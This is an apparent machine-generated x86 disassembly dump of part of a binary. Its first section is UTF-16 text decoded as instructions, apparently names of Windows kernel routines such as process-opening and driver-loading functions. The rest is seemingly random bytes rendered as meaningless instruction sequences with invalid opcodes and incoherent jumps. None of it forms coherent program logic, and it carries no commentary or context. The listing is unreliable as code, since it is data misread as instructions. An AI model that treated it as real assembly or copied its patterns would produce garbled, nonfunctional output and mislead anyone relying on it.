   1e0a6:	add    BYTE PTR gs:[edx+0x0],dh
   1e0aa:	jns    0x1e0ac
   1e0ac:	push   esi
   1e0ad:	add    BYTE PTR [edi+0x0],ch
   1e0b0:	ins    BYTE PTR es:[edi],dx
   1e0b1:	add    BYTE PTR [ebp+0x0],dh
   1e0b4:	ins    DWORD PTR es:[edi],dx
   1e0b5:	add    BYTE PTR [ebp+0x0],ah
   1e0b8:	dec    ecx
   1e0b9:	add    BYTE PTR [esi+0x0],ch
   1e0bc:	data16 add BYTE PTR [edi+0x0],ch
   1e0c0:	jb     0x1e0c2
   1e0c2:	ins    DWORD PTR es:[edi],dx
   1e0c3:	add    BYTE PTR [ecx+0x0],ah
   1e0c6:	je     0x1e0c8
   1e0c8:	imul   eax,DWORD PTR [eax],0x6e006f
   1e0ce:	inc    esi
   1e0cf:	add    BYTE PTR [ecx+0x0],ch
   1e0d2:	ins    BYTE PTR es:[edi],dx
   1e0d3:	add    BYTE PTR [ebp+0x0],ah
   1e0d6:	add    BYTE PTR [eax],al
   1e0d8:	pop    edx
   1e0d9:	add    BYTE PTR [edi+0x0],dh
   1e0dc:	inc    ebx
   1e0dd:	add    BYTE PTR [edx+0x0],dh
   1e0e0:	add    BYTE PTR gs:[ecx+0x0],ah
   1e0e4:	je     0x1e0e6
   1e0e6:	add    BYTE PTR gs:[esi+0x0],al
   1e0ea:	imul   eax,DWORD PTR [eax],0x65006c
   1e0f0:	add    BYTE PTR [eax],al
   1e0f2:	push   edx
   1e0f3:	add    BYTE PTR [eax+eax*1+0x6c],dh
   1e0f7:	add    BYTE PTR [ecx+0x0],cl
   1e0fa:	ins    DWORD PTR es:[edi],dx
   1e0fb:	add    BYTE PTR [ecx+0x0],ah
   1e0fe:	add    BYTE PTR [di+0x0],ah
   1e102:	dec    esi
   1e103:	add    BYTE PTR [eax+eax*1+0x48],dh
   1e107:	add    BYTE PTR [ebp+0x0],ah
   1e10a:	popa   
   1e10b:	add    BYTE PTR [eax+eax*1+0x65],ah
   1e10f:	add    BYTE PTR [edx+0x0],dh
   1e112:	add    BYTE PTR [eax],al
   1e114:	push   edx
   1e115:	add    BYTE PTR [eax+eax*1+0x6c],dh
   1e119:	add    BYTE PTR [ecx+0x0],cl
   1e11c:	ins    DWORD PTR es:[edi],dx
   1e11d:	add    BYTE PTR [ecx+0x0],ah
   1e120:	add    BYTE PTR [di+0x0],ah
   1e124:	inc    esp
   1e125:	add    BYTE PTR [ecx+0x0],ch
   1e128:	jb     0x1e12a
   1e12a:	add    BYTE PTR gs:[ebx+0x0],ah
   1e12e:	je     0x1e130
   1e130:	outs   dx,DWORD PTR ds:[esi]
   1e131:	add    BYTE PTR [edx+0x0],dh
   1e134:	jns    0x1e136
   1e136:	inc    ebp
   1e137:	add    BYTE PTR [esi+0x0],ch
   1e13a:	je     0x1e13c
   1e13c:	jb     0x1e13e
   1e13e:	jns    0x1e140
   1e140:	push   esp
   1e141:	add    BYTE PTR [edi+0x0],ch
   1e144:	inc    esp
   1e145:	add    BYTE PTR [ecx+0x0],ah
   1e148:	je     0x1e14a
   1e14a:	popa   
   1e14b:	add    BYTE PTR [eax],al
   1e14d:	add    BYTE PTR [edx+0x0],bl
   1e150:	ja     0x1e152
   1e152:	dec    edi
   1e153:	add    BYTE PTR [eax+0x0],dh
   1e156:	add    BYTE PTR gs:[esi+0x0],ch
   1e15a:	push   eax
   1e15b:	add    BYTE PTR [edx+0x0],dh
   1e15e:	outs   dx,DWORD PTR ds:[esi]
   1e15f:	add    BYTE PTR [ebx+0x0],ah
   1e162:	add    BYTE PTR gs:[ebx+0x0],dh
   1e166:	jae    0x1e168
   1e168:	push   esp
   1e169:	add    BYTE PTR [edi+0x0],ch
   1e16c:	imul   eax,DWORD PTR [eax],0x65
   1e16f:	add    BYTE PTR [esi+0x0],ch
   1e172:	add    BYTE PTR [eax],al
   1e174:	pop    edx
   1e175:	add    BYTE PTR [edi+0x0],dh
   1e178:	push   ebx
   1e179:	add    BYTE PTR [ebp+0x0],ah
   1e17c:	je     0x1e17e
   1e17e:	dec    ecx
   1e17f:	add    BYTE PTR [esi+0x0],ch
   1e182:	data16 add BYTE PTR [edi+0x0],ch
   1e186:	jb     0x1e188
   1e188:	ins    DWORD PTR es:[edi],dx
   1e189:	add    BYTE PTR [ecx+0x0],ah
   1e18c:	je     0x1e18e
   1e18e:	imul   eax,DWORD PTR [eax],0x6e006f
   1e194:	push   eax
   1e195:	add    BYTE PTR [edx+0x0],dh
   1e198:	outs   dx,DWORD PTR ds:[esi]
   1e199:	add    BYTE PTR [ebx+0x0],ah
   1e19c:	add    BYTE PTR gs:[ebx+0x0],dh
   1e1a0:	jae    0x1e1a2
   1e1a2:	add    BYTE PTR [eax],al
   1e1a4:	pop    edx
   1e1a5:	add    BYTE PTR [edi+0x0],dh
   1e1a8:	push   ecx
   1e1a9:	add    BYTE PTR [ebp+0x0],dh
   1e1ac:	add    BYTE PTR gs:[edx+0x0],dh
   1e1b0:	jns    0x1e1b2
   1e1b2:	dec    ecx
   1e1b3:	add    BYTE PTR [esi+0x0],ch
   1e1b6:	data16 add BYTE PTR [edi+0x0],ch
   1e1ba:	jb     0x1e1bc
   1e1bc:	ins    DWORD PTR es:[edi],dx
   1e1bd:	add    BYTE PTR [ecx+0x0],ah
   1e1c0:	je     0x1e1c2
   1e1c2:	imul   eax,DWORD PTR [eax],0x6e006f
   1e1c8:	push   esp
   1e1c9:	add    BYTE PTR [eax+0x0],ch
   1e1cc:	jb     0x1e1ce
   1e1ce:	add    BYTE PTR gs:[ecx+0x0],ah
   1e1d2:	add    BYTE PTR fs:[eax],al
   1e1d5:	add    BYTE PTR [edx+0x0],dl
   1e1d8:	je     0x1e1da
   1e1da:	ins    BYTE PTR es:[edi],dx
   1e1db:	add    BYTE PTR [ecx+0x0],al
   1e1de:	jae    0x1e1e0
   1e1e0:	jae    0x1e1e2
   1e1e2:	add    BYTE PTR gs:[edx+0x0],dh
   1e1e6:	je     0x1e1e8
   1e1e8:	add    BYTE PTR [eax],al
   1e1ea:	pop    edx
   1e1eb:	add    BYTE PTR [edi+0x0],dh
   1e1ee:	inc    ebp
   1e1ef:	add    BYTE PTR [esi+0x0],ch
   1e1f2:	jne    0x1e1f4
   1e1f4:	ins    DWORD PTR es:[edi],dx
   1e1f5:	add    BYTE PTR [ebp+0x0],ah
   1e1f8:	jb     0x1e1fa
   1e1fa:	popa   
   1e1fb:	add    BYTE PTR [eax+eax*1+0x65],dh
   1e1ff:	add    BYTE PTR [ebx+0x0],cl
   1e202:	add    BYTE PTR gs:[ecx+0x0],bh
   1e206:	add    BYTE PTR [eax],al
   1e208:	pop    edx
   1e209:	add    BYTE PTR [edi+0x0],dh
   1e20c:	dec    esp
   1e20d:	add    BYTE PTR [edi+0x0],ch
   1e210:	popa   
   1e211:	add    BYTE PTR [eax+eax*1+0x44],ah
   1e215:	add    BYTE PTR [edx+0x0],dh
   1e218:	imul   eax,DWORD PTR [eax],0x650076
   1e21e:	jb     0x1e220
   1e220:	add    BYTE PTR [eax],al
   1e222:	pop    edx
   1e223:	add    BYTE PTR [edi+0x0],dh
   1e226:	inc    ebx
   1e227:	add    BYTE PTR [edx+0x0],dh
   1e22a:	add    BYTE PTR gs:[ecx+0x0],ah
   1e22e:	je     0x1e230
   1e230:	add    BYTE PTR gs:[ebx+0x0],cl
   1e234:	add    BYTE PTR gs:[ecx+0x0],bh
   1e238:	add    BYTE PTR [eax],al
   1e23a:	dec    ecx
   1e23b:	add    BYTE PTR [edi+0x0],ch
   1e23e:	inc    esp
   1e23f:	add    BYTE PTR [ebp+0x0],ah
   1e242:	ins    BYTE PTR es:[edi],dx
   1e243:	add    BYTE PTR [ebp+0x0],ah
   1e246:	je     0x1e248
   1e248:	add    BYTE PTR gs:[eax+eax*1+0x65],al
   1e24d:	add    BYTE PTR [esi+0x0],dh
   1e250:	imul   eax,DWORD PTR [eax],0x650063
   1e256:	add    BYTE PTR [eax],al
   1e258:	dec    ebx
   1e259:	add    BYTE PTR [ebp+0x0],ah
   1e25c:	inc    esp
   1e25d:	add    BYTE PTR [ebp+0x0],ah
   1e260:	je     0x1e262
   1e262:	popa   
   1e263:	add    BYTE PTR [ebx+0x0],ah
   1e266:	push   0x72005000
   1e26b:	add    BYTE PTR [edi+0x0],ch
   1e26e:	arpl   WORD PTR [eax],ax
   1e270:	add    BYTE PTR gs:[ebx+0x0],dh
   1e274:	jae    0x1e276
   1e276:	add    BYTE PTR [eax],al
   1e278:	dec    ebx
   1e279:	add    BYTE PTR [ebp+0x0],ah
   1e27c:	inc    ecx
   1e27d:	add    BYTE PTR [eax+eax*1+0x74],dh
   1e281:	add    BYTE PTR [ecx+0x0],ah
   1e284:	arpl   WORD PTR [eax],ax
   1e286:	push   0x72005000
   1e28b:	add    BYTE PTR [edi+0x0],ch
   1e28e:	arpl   WORD PTR [eax],ax
   1e290:	add    BYTE PTR gs:[ebx+0x0],dh
   1e294:	jae    0x1e296
   1e296:	add    BYTE PTR [eax],al
   1e298:	pop    edx
   1e299:	add    BYTE PTR [edi+0x0],dh
   1e29c:	push   ecx
   1e29d:	add    BYTE PTR [ebp+0x0],dh
   1e2a0:	add    BYTE PTR gs:[edx+0x0],dh
   1e2a4:	jns    0x1e2a6
   1e2a6:	push   esi
   1e2a7:	add    BYTE PTR [ecx+0x0],ah
   1e2aa:	ins    BYTE PTR es:[edi],dx
   1e2ab:	add    BYTE PTR [ebp+0x0],dh
   1e2ae:	add    BYTE PTR gs:[ebx+0x0],cl
   1e2b2:	add    BYTE PTR gs:[ecx+0x0],bh
   1e2b6:	add    BYTE PTR [eax],al
   1e2b8:	pop    edx
   1e2b9:	add    BYTE PTR [edi+0x0],dh
   1e2bc:	push   edx
   1e2bd:	add    BYTE PTR [ebp+0x0],ah
   1e2c0:	popa   
   1e2c1:	add    BYTE PTR [eax+eax*1+0x46],ah
   1e2c5:	add    BYTE PTR [ecx+0x0],ch
   1e2c8:	ins    BYTE PTR es:[edi],dx
   1e2c9:	add    BYTE PTR [ebp+0x0],ah
   1e2cc:	add    BYTE PTR [eax],al
   1e2ce:	pop    edx
   1e2cf:	add    BYTE PTR [edi+0x0],dh
   1e2d2:	push   ebx
   1e2d3:	add    BYTE PTR [ebp+0x0],ah
   1e2d6:	je     0x1e2d8
   1e2d8:	dec    ecx
   1e2d9:	add    BYTE PTR [esi+0x0],ch
   1e2dc:	data16 add BYTE PTR [edi+0x0],ch
   1e2e0:	jb     0x1e2e2
   1e2e2:	ins    DWORD PTR es:[edi],dx
   1e2e3:	add    BYTE PTR [ecx+0x0],ah
   1e2e6:	je     0x1e2e8
   1e2e8:	imul   eax,DWORD PTR [eax],0x6e006f
   1e2ee:	inc    esi
   1e2ef:	add    BYTE PTR [ecx+0x0],ch
   1e2f2:	ins    BYTE PTR es:[edi],dx
   1e2f3:	add    BYTE PTR [ebp+0x0],ah
   1e2f6:	add    BYTE PTR [eax],al
   1e2f8:	pop    edx
   1e2f9:	add    BYTE PTR [edi+0x0],dh
   1e2fc:	push   edi
   1e2fd:	add    BYTE PTR [edx+0x0],dh
   1e300:	imul   eax,DWORD PTR [eax],0x650074
   1e306:	inc    esi
   1e307:	add    BYTE PTR [ecx+0x0],ch
   1e30a:	ins    BYTE PTR es:[edi],dx
   1e30b:	add    BYTE PTR [ebp+0x0],ah
   1e30e:	add    BYTE PTR [eax],al
   1e310:	pop    edx
   1e311:	add    BYTE PTR [edi+0x0],dh
   1e314:	push   ecx
   1e315:	add    BYTE PTR [ebp+0x0],dh
   1e318:	add    BYTE PTR gs:[edx+0x0],dh
   1e31c:	jns    0x1e31e
   1e31e:	dec    ecx
   1e31f:	add    BYTE PTR [esi+0x0],ch
   1e322:	data16 add BYTE PTR [edi+0x0],ch
   1e326:	jb     0x1e328
   1e328:	ins    DWORD PTR es:[edi],dx
   1e329:	add    BYTE PTR [ecx+0x0],ah
   1e32c:	je     0x1e32e
   1e32e:	imul   eax,DWORD PTR [eax],0x6e006f
   1e334:	inc    esi
   1e335:	add    BYTE PTR [ecx+0x0],ch
   1e338:	ins    BYTE PTR es:[edi],dx
   1e339:	add    BYTE PTR [ebp+0x0],ah
   1e33c:	add    BYTE PTR [eax],al
   1e33e:	dec    ecx
   1e33f:	add    BYTE PTR [edi+0x0],ch
   1e342:	inc    ebx
   1e343:	add    BYTE PTR [edx+0x0],dh
   1e346:	add    BYTE PTR gs:[ecx+0x0],ah
   1e34a:	je     0x1e34c
   1e34c:	add    BYTE PTR gs:[ebx+0x0],dl
   1e350:	jns    0x1e352
   1e352:	ins    DWORD PTR es:[edi],dx
   1e353:	add    BYTE PTR [edx+0x0],ah
   1e356:	outs   dx,DWORD PTR ds:[esi]
   1e357:	add    BYTE PTR [eax+eax*1+0x69],ch
   1e35b:	add    BYTE PTR [ebx+0x0],ah
   1e35e:	dec    esp
   1e35f:	add    BYTE PTR [ecx+0x0],ch
   1e362:	outs   dx,BYTE PTR ds:[esi]
   1e363:	add    BYTE PTR [ebx+0x0],ch
   1e366:	add    BYTE PTR [eax],al
   1e368:	dec    ecx
   1e369:	add    BYTE PTR [edi+0x0],ch
   1e36c:	inc    ebx
   1e36d:	add    BYTE PTR [edx+0x0],dh
   1e370:	add    BYTE PTR gs:[ecx+0x0],ah
   1e374:	je     0x1e376
   1e376:	add    BYTE PTR gs:[eax+eax*1+0x65],al
   1e37b:	add    BYTE PTR [esi+0x0],dh
   1e37e:	imul   eax,DWORD PTR [eax],0x650063
   1e384:	add    BYTE PTR [eax],al
   1e386:	push   ebx
   1e387:	add    BYTE PTR [ebp+0x0],ah
   1e38a:	inc    ebx
   1e38b:	add    BYTE PTR [edx+0x0],dh
   1e38e:	add    BYTE PTR gs:[ecx+0x0],ah
   1e392:	je     0x1e394
   1e394:	add    BYTE PTR gs:[ebx+0x0],al
   1e398:	ins    BYTE PTR es:[edi],dx
   1e399:	add    BYTE PTR [ecx+0x0],ch
   1e39c:	add    BYTE PTR gs:[esi+0x0],ch
   1e3a0:	je     0x1e3a2
   1e3a2:	push   ebx
   1e3a3:	add    BYTE PTR [ebp+0x0],ah
   1e3a6:	arpl   WORD PTR [eax],ax
   1e3a8:	jne    0x1e3aa
   1e3aa:	jb     0x1e3ac
   1e3ac:	imul   eax,DWORD PTR [eax],0x790074
   1e3b2:	add    BYTE PTR [eax],al
   1e3b4:	pop    edx
   1e3b5:	add    BYTE PTR [edi+0x0],dh
   1e3b8:	dec    ebp
   1e3b9:	add    BYTE PTR [ecx+0x0],ah
   1e3bc:	jo     0x1e3be
   1e3be:	push   esi
   1e3bf:	add    BYTE PTR [ecx+0x0],ch
   1e3c2:	add    BYTE PTR gs:[edi+0x0],dh
   1e3c6:	dec    edi
   1e3c7:	add    BYTE PTR [esi+0x0],ah
   1e3ca:	push   ebx
   1e3cb:	add    BYTE PTR [ebp+0x0],ah
   1e3ce:	arpl   WORD PTR [eax],ax
   1e3d0:	je     0x1e3d2
   1e3d2:	imul   eax,DWORD PTR [eax],0x6e006f
   1e3d8:	add    BYTE PTR [eax],al
   1e3da:	pop    edx
   1e3db:	add    BYTE PTR [edi+0x0],dh
   1e3de:	push   ebp
   1e3df:	add    BYTE PTR [esi+0x0],ch
   1e3e2:	ins    DWORD PTR es:[edi],dx
   1e3e3:	add    BYTE PTR [ecx+0x0],ah
   1e3e6:	jo     0x1e3e8
   1e3e8:	push   esi
   1e3e9:	add    BYTE PTR [ecx+0x0],ch
   1e3ec:	add    BYTE PTR gs:[edi+0x0],dh
   1e3f0:	dec    edi
   1e3f1:	add    BYTE PTR [esi+0x0],ah
   1e3f4:	push   ebx
   1e3f5:	add    BYTE PTR [ebp+0x0],ah
   1e3f8:	arpl   WORD PTR [eax],ax
   1e3fa:	je     0x1e3fc
   1e3fc:	imul   eax,DWORD PTR [eax],0x6e006f
   1e402:	add    BYTE PTR [eax],al
   1e404:	dec    ebx
   1e405:	add    BYTE PTR [ebp+0x0],ah
   1e408:	dec    ecx
   1e409:	add    BYTE PTR [esi+0x0],ch
   1e40c:	imul   eax,DWORD PTR [eax],0x690074
   1e412:	popa   
   1e413:	add    BYTE PTR [eax+eax*1+0x69],ch
   1e417:	add    BYTE PTR [edx+0x0],bh
   1e41a:	add    BYTE PTR gs:[ebp+0x0],cl
   1e41e:	jne    0x1e420
   1e420:	je     0x1e422
   1e422:	add    BYTE PTR gs:[eax+0x0],bh
   1e426:	add    BYTE PTR [eax],al
   1e428:	push   edx
   1e429:	add    BYTE PTR [eax+eax*1+0x6c],dh
   1e42d:	add    BYTE PTR [ecx+0x0],cl
   1e430:	outs   dx,BYTE PTR ds:[esi]
   1e431:	add    BYTE PTR [ecx+0x0],ch
   1e434:	je     0x1e436
   1e436:	push   ebp
   1e437:	add    BYTE PTR [esi+0x0],ch
   1e43a:	imul   eax,DWORD PTR [eax],0x6f0063
   1e440:	add    BYTE PTR fs:[ebp+0x0],ah
   1e444:	push   ebx
   1e445:	add    BYTE PTR [eax+eax*1+0x72],dh
   1e449:	add    BYTE PTR [ecx+0x0],ch
   1e44c:	outs   dx,BYTE PTR ds:[esi]
   1e44d:	add    BYTE PTR [edi+0x0],ah
   1e450:	add    BYTE PTR [eax],al
   1e452:	dec    edi
   1e453:	add    BYTE PTR [edx+0x0],ah
   1e456:	data16 add BYTE PTR [eax+eax*1+0x65],al
   1e45b:	add    BYTE PTR [edx+0x0],dh
   1e45e:	add    BYTE PTR gs:[esi+0x0],ah
   1e462:	add    BYTE PTR gs:[edx+0x0],dh
   1e466:	add    BYTE PTR gs:[esi+0x0],ch
   1e46a:	arpl   WORD PTR [eax],ax
   1e46c:	add    BYTE PTR gs:[edi+0x0],cl
   1e470:	bound  eax,QWORD PTR [eax]
   1e472:	push   0x0
   1e474:	add    BYTE PTR gs:[ebx+0x0],ah
   1e478:	je     0x1e47a
   1e47a:	add    BYTE PTR [eax],al
   1e47c:	push   eax
   1e47d:	add    BYTE PTR [ebx+0x0],dh
   1e480:	dec    esp
   1e481:	add    BYTE PTR [edi+0x0],ch
   1e484:	outs   dx,DWORD PTR ds:[esi]
   1e485:	add    BYTE PTR [ebx+0x0],ch
   1e488:	jne    0x1e48a
   1e48a:	jo     0x1e48c
   1e48c:	push   eax
   1e48d:	add    BYTE PTR [edx+0x0],dh
   1e490:	outs   dx,DWORD PTR ds:[esi]
   1e491:	add    BYTE PTR [ebx+0x0],ah
   1e494:	add    BYTE PTR gs:[ebx+0x0],dh
   1e498:	jae    0x1e49a
   1e49a:	inc    edx
   1e49b:	add    BYTE PTR [ecx+0x0],bh
   1e49e:	push   eax
   1e49f:	add    BYTE PTR [edx+0x0],dh
   1e4a2:	outs   dx,DWORD PTR ds:[esi]
   1e4a3:	add    BYTE PTR [ebx+0x0],ah
   1e4a6:	add    BYTE PTR gs:[ebx+0x0],dh
   1e4aa:	jae    0x1e4ac
   1e4ac:	dec    ecx
   1e4ad:	add    BYTE PTR [eax+eax*1+0x0],ah
   1e4b1:	add    BYTE PTR [ebx+0x0],cl
   1e4b4:	add    BYTE PTR gs:[edi+0x0],al
   1e4b8:	add    BYTE PTR gs:[eax+eax*1+0x43],dh
   1e4bd:	add    BYTE PTR [ebp+0x0],dh
   1e4c0:	jb     0x1e4c2
   1e4c2:	jb     0x1e4c4
   1e4c4:	add    BYTE PTR gs:[esi+0x0],ch
   1e4c8:	je     0x1e4ca
   1e4ca:	push   esp
   1e4cb:	add    BYTE PTR [eax+0x0],ch
   1e4ce:	jb     0x1e4d0
   1e4d0:	add    BYTE PTR gs:[ecx+0x0],ah
   1e4d4:	add    BYTE PTR fs:[eax],al
   1e4d7:	add    BYTE PTR [eax+eax*1+0x2d],dl
   1e4db:	add    BYTE PTR [ecx],cl
   1e4dd:	add    BYTE PTR ds:0xa2000000,dl
   1e4e3:	pop    ebp
   1e4e4:	adc    BYTE PTR [ebx+0x3dbe44b9],ch
   1e4ea:	cmp    ecx,ecx
   1e4ec:	and    edx,DWORD PTR [ebp+0x3f]
   1e4ef:	jb     0x1e4dd
   1e4f1:	les    ebp,FWORD PTR [ebp+0x77]
   1e4f4:	xchg   BYTE PTR [esi-0x2c],dh
   1e4f7:	add    bh,BYTE PTR [edx-0x40953c8]
   1e4fd:	int3   
   1e4fe:	ret    0xda16
   1e501:	sub    DWORD PTR [ebx-0x5],ecx
   1e504:	in     al,dx
   1e505:	inc    edx
   1e506:	out    0xd6,eax
   1e508:	or     cl,al
   1e50a:	cmp    eax,DWORD PTR [eax]
   1e50c:	push   ebx
   1e50d:	add    BYTE PTR [edi],ah
   1e50f:	add    BYTE PTR ds:0x6001300,dl
   1e515:	add    BYTE PTR [eax],al
   1e517:	add    BYTE PTR [esi+0x53],dh
   1e51a:	mov    WORD PTR [edi+eiz*8+0x32],cs
   1e51e:	aas    
   1e51f:	cmp    ebx,DWORD PTR [edx]
   1e521:	scas   eax,DWORD PTR es:[edi]
   1e522:	outs   dx,BYTE PTR ds:[esi]
   1e523:	sbb    DWORD PTR [edi],ecx
   1e525:	(bad)  
   1e526:	mov    ebx,0x929f8f19
   1e52b:	dec    esi
   1e52c:	inc    eax
   1e52d:	push   ebx
   1e52e:	rol    DWORD PTR [edi+0x13],0x9d
   1e532:	mov    ch,0xff
   1e534:	aad    0x6a
   1e536:	es fs cmp al,0xb5
   1e53a:	ins    BYTE PTR es:[edi],dx
   1e53b:	add    al,0x40
   1e53d:	xchg   ebp,eax
   1e53e:	sub    ecx,0xa99ba73b
   1e544:	jp     0x1e56d
   1e546:	(bad)  
   1e547:	les    esi,FWORD PTR [eax+0xe]
   1e54a:	xor    eax,0x49cc003e
   1e54f:	add    BYTE PTR [eax+eax*1],ah
   1e552:	or     al,0x0
   1e554:	push   es
   1e555:	add    BYTE PTR [edx],al
   1e557:	add    BYTE PTR ds:0x15003100,dh
   1e55d:	add    BYTE PTR [eax+eax*1],bl
   1e560:	add    BYTE PTR [eax],al
   1e562:	or     DWORD PTR [ebx+0x252a4c2a],ebp
   1e568:	aam    0xf8
   1e56a:	pop    esp
   1e56b:	es ja  0x1e566
   1e56e:	popf   
   1e56f:	inc    ebx
   1e570:	xchg   ebp,eax
   1e571:	iret   
   1e572:	mov    ds:0x408386f4,al
   1e577:	cld    
   1e578:	rcl    BYTE PTR [esi],cl
   1e57a:	cmp    esp,DWORD PTR [eax]
   1e57c:	daa    
   1e57d:	adc    BYTE PTR [edx+ebp*1-0x270d2afa],dl
   1e584:	xchg   ebx,eax
   1e585:	iret   
   1e586:	jmp    0x1e576
   1e588:	test   DWORD PTR [eax],ebp
   1e58a:	sbb    edi,DWORD PTR [ecx+0x37]
   1e58d:	in     eax,0x14
   1e58f:	retf   
   1e590:	xchg   ebx,eax
   1e591:	sub    eax,0xe203448e
   1e596:	mov    ch,0x2c
   1e598:	dec    ebx
   1e599:	inc    esp
   1e59a:	cdq    
   1e59b:	out    0x6d,al
   1e59d:	add    BYTE PTR [esi],ch
   1e59f:	add    BYTE PTR [edx+0x0],cl
   1e5a2:	or     BYTE PTR [eax],al
   1e5a4:	add    BYTE PTR [eax],al
   1e5a6:	add    BYTE PTR [eax],al
   1e5a8:	pusha  
   1e5a9:	dec    ebx
   1e5aa:	sub    DWORD PTR [ebp+0x45],ebx
   1e5ad:	mov    ah,0x55
   1e5af:	inc    ebx
   1e5b0:	and    edi,DWORD PTR [eax+ecx*4]
   1e5b3:	mov    eax,0x13994104
   1e5b8:	and    BYTE PTR [eax+0x54],cl
   1e5bb:	mov    ch,0xf8
   1e5bd:	scas   al,BYTE PTR es:[edi]
   1e5be:	xchg   esp,eax
   1e5bf:	inc    ebx
   1e5c0:	jns    0x1e610
   1e5c2:	mov    ah,0x5e
   1e5c4:	xchg   edx,eax
   1e5c5:	fs jg  0x1e624
   1e5c8:	aaa    
   1e5c9:	cld    
   1e5ca:	mov    edx,0x5a86023c
   1e5cf:	xor    ah,dh
   1e5d1:	mov    BYTE PTR [eax-0x104a501],ch
   1e5d7:	into   
   1e5d8:	xchg   ah,al
   1e5da:	retf   
   1e5db:	lds    edi,FWORD PTR [esp+ebp*2+0x6ecc00]
   1e5e2:	sbb    al,BYTE PTR [eax]
   1e5e4:	adc    BYTE PTR [eax],al
   1e5e6:	or     BYTE PTR [eax],al
   1e5e8:	add    BYTE PTR [eax],al
   1e5ea:	inc    edx
   1e5eb:	add    BYTE PTR [edx+0x0],cl
   1e5ee:	or     BYTE PTR [eax],al
   1e5f0:	add    BYTE PTR [eax],al
   1e5f2:	add    BYTE PTR [eax],al
   1e5f4:	int3   
   1e5f5:	fs xchg edi,eax
   1e5f7:	mov    ebx,0xf449395f
   1e5fc:	pop    esp
   1e5fd:	in     eax,0x11
   1e5ff:	stc    
   1e600:	outs   dx,DWORD PTR ds:[esi]
   1e601:	fdivr  QWORD PTR [ecx+0x1b]
   1e604:	push   0xcadee471
   1e609:	shl    DWORD PTR [edx],1
   1e60b:	neg    DWORD PTR cs:[ebx]
   1e60e:	sbb    bl,BYTE PTR [edx-0xb]
   1e611:	stos   DWORD PTR es:[edi],eax
   1e612:	ficom  WORD PTR [eax+0x360f5132]
   1e618:	aad    0x64
   1e61a:	add    ah,cl
   1e61c:	inc    edx
   1e61d:	daa    
   1e61e:	add    BYTE PTR ds:0x72cfcc00,dl
   1e624:	jne    0x1e5cb
   1e626:	ret    
   1e627:	xor    eax,0x131d2efb
   1e62c:	loop   0x1e5af
   1e62e:	sub    eax,0x2f845bbf
   1e633:	jg     0x1e604
   1e635:	data16 icebp 
   1e637:	xlat   BYTE PTR ds:[ebx]
   1e638:	adc    DWORD PTR [eax+0x6864440c],edi
   1e63e:	dec    edx
   1e63f:	cmp    BYTE PTR ds:0x607def7f,0x60
   1e646:	mov    edi,0x1e620c6a
   1e64b:	cwde   
   1e64c:	inc    ecx
   1e64d:	xlat   BYTE PTR ds:[ebx]
   1e64e:	loop   0x1e6ac
   1e650:	push   ds
   1e651:	addr16 mov al,0x8f
   1e654:	fiadd  WORD PTR [eax+0x3e]
   1e657:	jae    0x1e683
   1e659:	jb     0x1e5f2
   1e65b:	cmc    
   1e65c:	sbb    BYTE PTR [esi+0x5e],ah
   1e65f:	xchg   ebx,eax
   1e660:	cdq    
   1e661:	add    BYTE PTR [ebx+0x3f],dl
   1e664:	or     DWORD PTR [eax],eax
   1e666:	adc    eax,0x317fd800
   1e66b:	fs add eax,0x100e18ab
   1e671:	mov    ecx,0x99179250
   1e676:	lods   eax,DWORD PTR ds:[esi]
   1e677:	push   ebx
   1e678:	(bad)  
   1e67a:	sbb    eax,0xf7136165
   1e67f:	scas   al,BYTE PTR es:[edi]
   1e680:	es push esi
   1e682:	xchg   al,bl
   1e684:	shl    dh,cl
   1e686:	sub    al,0xd2
   1e688:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
   1e689:	imul   esp,DWORD PTR [esi+edi*4],0x0
   1e68d:	int3   
   1e68e:	inc    ebx
   1e68f:	xor    DWORD PTR [edi],edx
   1e691:	add    al,0x15
   1e693:	adc    DWORD PTR [ecx],esi
   1e695:	cmp    al,0x1a
   1e697:	pop    ss
   1e698:	add    al,0x5
   1e69a:	add    ah,cl
   1e69c:	sahf   
   1e69d:	mov    ecx,0x25d37b82
   1e6a2:	xlat   BYTE PTR fs:[ebx]
   1e6a4:	int3   
   1e6a5:	sbb    eax,0xeaf7d656
   1e6aa:	mov    ecx,gs
   1e6ac:	scas   eax,DWORD PTR es:[edi]
   1e6ad:	jae    0x1e694
   1e6af:	xchg   ebp,eax
   1e6b0:	jne    0x1e6f4
   1e6b2:	test   DWORD PTR [eax-0xf],0xfbb208ba
   1e6b9:	mov    eax,ebp
   1e6bb:	mov    esi,0x5764d9be
   1e6c0:	pop    ds
   1e6c1:	call   0x26bc44a2
   1e6c6:	pop    ecx
   1e6c7:	mov    DWORD PTR [edx],ebx
   1e6c9:	jmp    FWORD PTR [eax]
   1e6cb:	ret    
   1e6cc:	pop    ds
   1e6cd:	add    esi,edx
   1e6cf:	idiv   DWORD PTR [esi+0x1a6d088a]
   1e6d5:	push   ds
   1e6d6:	add    ah,cl
   1e6d8:	dec    esp
   1e6d9:	and    ecx,DWORD PTR [esi]
   1e6db:	add    eax,0x100b2528
   1e6e0:	adc    edx,DWORD PTR [ebx]
   1e6e2:	or     edi,DWORD PTR [eax]
   1e6e4:	add    ah,cl
   1e6e6:	jb     0x1e73e
   1e6e8:	sbb    esi,edx
   1e6ea:	and    al,0xe8
   1e6ec:	cld    
   1e6ed:	or     eax,0x884a0a03
   1e6f2:	add    BYTE PTR [esi],0x4a
   1e6f5:	sti    
   1e6f6:	ins    DWORD PTR es:[edi],dx
   1e6f7:	inc    esp
   1e6f8:	out    0xd3,al
   1e6fa:	push   0x38
   1e6fc:	test   ebx,ecx
   1e6fe:	push   es
   1e6ff:	mov    BYTE PTR ds:0x4de01e,bh
   1e705:	cmp    eax,0x843f23da
   1e70a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
   1e70b:	sub    edi,DWORD PTR [ebx]
   1e70d:	shl    dh,0xa2
   1e710:	in     eax,0x9e
   1e712:	fsubp  st(0),st
   1e714:	pop    ebp
   1e715:	mov    eax,0x92f460cf
   1e71a:	sbb    bh,ah
   1e71c:	scas   al,BYTE PTR es:[edi]
   1e71d:	loopne 0x1e70d
   1e71f:	mov    ecx,0xcc00ff1b
   1e724:	dec    esp
   1e725:	and    ecx,DWORD PTR [esi]
   1e727:	add    eax,0x100b2528
   1e72c:	adc    edx,DWORD PTR [ebx]
   1e72e:	or     ebp,DWORD PTR [esi]
   1e730:	add    ah,cl
   1e732:	mov    gs,esp
   1e734:	test   dl,ah
   1e736:	aas    
   1e737:	pop    esp
   1e738:	std    
